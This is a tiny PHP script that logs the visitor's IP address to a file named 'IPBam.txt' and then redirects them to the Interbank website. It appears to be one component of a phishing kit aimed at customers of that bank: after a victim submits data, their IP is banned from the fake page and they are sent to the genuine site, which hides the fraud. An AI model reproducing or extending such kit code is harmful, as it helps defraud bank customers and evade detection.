<?php
require "../var1.php";
$ban = fopen("../IPBam.txt","a+");
fwrite($ban,$Ip."\r\n");
fclose($ban);
header("Location: https://interbank.pe");
exit;
